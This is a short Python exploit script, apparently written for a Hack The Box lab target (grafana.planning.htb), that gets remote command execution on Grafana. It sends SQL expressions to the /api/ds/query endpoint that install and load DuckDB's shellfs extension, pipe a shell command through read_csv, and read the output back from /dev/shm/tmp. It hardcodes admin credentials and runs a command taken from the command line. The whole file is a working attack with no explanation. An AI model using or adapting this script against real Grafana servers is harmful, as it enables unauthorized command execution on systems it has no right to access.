#!/usr/bin/env python3
import requests
import json
import sys

def mkHeaders():
    return {"Content-Type": "application/json"}

def mkPayload(command):
    return { "queries": [ { "refId": "B", "datasource": { "type": "__expr__", "uid": "__expr__", "name": "Expression" }, "type": "sql", "hide": False, "expression": command, "window": "" } ], "from": "1729313027261", "to": "1729313027261" }

def execommand(url, user, passwd, cmd):
    sqlcommand = f'SELECT 1; install shellfs FROM community; LOAD shellfs; SELECT * FROM read_csv("{cmd} >/dev/shm/tmp 2>&1|")'
    mainexec(url, user, passwd, sqlcommand.strip())
    return mainexec(url, user, passwd, 'SELECT content FROM read_blob("/dev/shm/tmp")')

def mainexec(url, username, password, command):
    furl = url.rstrip('/') + '/api/ds/query?ds_type=__expr__&expression=true&requestId=Q101'
    try:
        r = requests.post(furl, auth=(username, password), json=mkPayload(command), headers=mkHeaders())
        r.raise_for_status()
        res = r.json()['results']['B']['frames'][0]['data']['values'][0][0]
        return str(res).encode('utf-8').decode('unicode_escape')
    except Exception as e:
        print('Error:', e)
        return False

if __name__ == "__main__":
    url = 'http://grafana.planning.htb'
    u = 'admin'
    p = '0D5oT70Fq13EvB5r'
    command = sys.argv[1] if len(sys.argv) == 2 else 'whoami'
    out = execommand(url, u, p, command)
    if out:
        print(out)
